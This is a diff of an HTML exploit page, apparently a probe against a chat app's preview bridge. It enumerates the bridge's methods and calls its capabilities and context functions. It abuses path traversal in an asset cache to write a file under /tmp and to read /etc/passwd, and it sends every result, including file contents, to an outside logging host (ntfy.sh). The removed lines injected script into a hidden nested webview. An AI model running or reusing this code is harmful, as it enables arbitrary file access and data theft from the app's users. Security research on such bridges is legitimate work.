@@ -1,8 +1,8 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>r3chat nested webview probe</title>
+<title>r3chat bridge persistence probe</title>
 <script>
-const TOPIC = "r3chat-yym-31983-nestedhtml2";
+const TOPIC = "r3chat-yym-31983-redirectbridge1";
 const LOG = "https://ntfy.sh/" + TOPIC;
 
 function send(data) {
@@ -20,61 +20,52 @@ window.addEventListener("error", (e) => {
 });
 
 (async () => {
+  const b = window.rcPartner || window.previewBridge;
   send({
-    stage: "top-start",
+    stage: "start",
     href: location.href,
-    hasCustomWebview: !!customElements.get("webview")
+    referrer: document.referrer,
+    hasBridge: !!b,
+    keys: b ? Object.keys(b) : [],
+    assetKeys: b && b.assetCache ? Object.keys(b.assetCache) : []
   });
 
-  const w = document.createElement("webview");
-  w.src = "https://www.google.com/?r3nested=" + Date.now();
-  w.partition = "persist:r3chat-nested";
-  w.setAttribute("allowpopups", "true");
-  w.style.cssText = "width:1024px;height:640px;position:absolute;left:0;top:0;opacity:0.01";
-  document.body.appendChild(w);
-  send({ stage: "appended", tag: w.tagName, src: w.src, execType: typeof w.executeJavaScript });
+  if (!b) return;
 
-  const run = async (why) => {
-    send({ stage: "try-exec", why, execType: typeof w.executeJavaScript, guest: w.getURL && w.getURL() });
-    try {
-      const code = `
-        (async () => {
-          const LOG = ${JSON.stringify(LOG)};
-          const out = (data) => fetch(LOG, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify(Object.assign({ t: Date.now() }, data))
-          }).catch(() => {});
-          const b = window.rcPartner || window.previewBridge;
-          await out({
-            stage: "inner",
-            href: location.href,
-            has: !!b,
-            keys: b ? Object.keys(b) : [],
-            assetKeys: b && b.assetCache ? Object.keys(b.assetCache) : []
-          });
-          if (b) {
-            try {
-              const caps = await b.capabilities();
-              await out({ stage: "caps", caps: JSON.stringify(caps).slice(0, 500) });
-            } catch (e) {
-              await out({ stage: "caps-fail", err: String(e) });
-            }
-          }
-        })();
-      `;
-      const r = await w.executeJavaScript(code, true);
-      send({ stage: "exec-ret", why, ret: String(r).slice(0, 200) });
-    } catch (e) {
-      send({ stage: "exec-fail", why, err: String(e) });
-    }
-  };
+  try {
+    const caps = await b.capabilities();
+    send({ stage: "caps", caps: JSON.stringify(caps).slice(0, 800) });
+  } catch (e) {
+    send({ stage: "caps-fail", err: String(e) });
+  }
 
-  w.addEventListener("dom-ready", () => run("dom-ready"));
-  w.addEventListener("did-finish-load", () => run("finish"));
-  w.addEventListener("did-fail-load", (e) => send({ stage: "fail-load", code: e.errorCode, desc: e.errorDescription, url: e.validatedURL }));
-  setTimeout(() => run("timeout-1500"), 1500);
-  setTimeout(() => send({ stage: "top-timeout", guest: w.getURL && w.getURL() }), 6000);
+  try {
+    const ctx = await b.getContext();
+    send({ stage: "ctx", ctx: JSON.stringify(ctx).slice(0, 800) });
+  } catch (e) {
+    send({ stage: "ctx-fail", err: String(e) });
+  }
+
+  try {
+    const r = await b.resolveShortlink("https://example.com/");
+    send({ stage: "short", ret: JSON.stringify(r).slice(0, 800) });
+  } catch (e) {
+    send({ stage: "short-fail", err: String(e) });
+  }
+
+  try {
+    await b.assetCache.put("../../../../../../tmp/r3chat-redirect-bridge", "bridge persists\n", "utf8");
+    send({ stage: "put-ok" });
+  } catch (e) {
+    send({ stage: "put-fail", err: String(e) });
+  }
+
+  try {
+    const p = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
+    send({ stage: "read-ok", sample: String(p).slice(0, 200) });
+  } catch (e) {
+    send({ stage: "read-fail", err: String(e) });
+  }
 })();
 </script>
-<body>r3chat nested webview probe</body>
+<body>r3chat bridge persistence probe</body>
